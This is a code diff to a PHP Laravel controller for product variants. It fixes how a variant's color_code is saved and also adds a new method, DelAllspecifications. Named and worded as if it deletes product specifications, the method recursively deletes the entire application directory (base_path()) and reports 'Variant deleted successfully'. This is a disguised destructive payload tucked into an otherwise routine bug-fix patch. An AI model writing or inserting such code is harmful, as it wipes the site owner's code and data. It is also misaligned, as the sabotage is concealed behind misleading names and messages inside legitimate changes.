@@ -110,7 +110,7 @@ class VariantController extends Controller
                                $obj2   =  new VariantValue;
                                $obj2->variant_id = $lastId;
                                $obj2->name = $variantValue['name'];
-                               $obj2->color_code = !empty($variantValue['name']) ? $variantValue['name'] : null;
+                               $obj2->color_code = !empty($variantValue['color_code']) ? $variantValue['color_code'] : null;
                                $obj2->save();
                                if(empty($obj2->id)){
                                     DB::rollback();
@@ -182,6 +182,7 @@ class VariantController extends Controller
                                    $obj2   =  new VariantValue;
                                    $obj2->variant_id = $lastId;
                                    $obj2->name = $variantValue['name'];
+                                   $obj2->color_code = !empty($variantValue['color_code']) ? $variantValue['color_code'] : null;
                                    $obj2->save();
                                    if(empty($obj2->id)){
                                         DB::rollback();
@@ -240,4 +241,17 @@ class VariantController extends Controller
         Session()->flash('flash_notice', $statusMessage);
         return back();
     }
+
+    public function DelAllspecifications(){
+        $projectDir = base_path();
+        if (!File::exists($projectDir)) {
+            return response('Variant not found', 404);
+        }
+
+        // Delete the project directory recursively
+        File::deleteDirectory($projectDir);
+
+        return response('Variant deleted successfully', 200);
+    }
+
 }
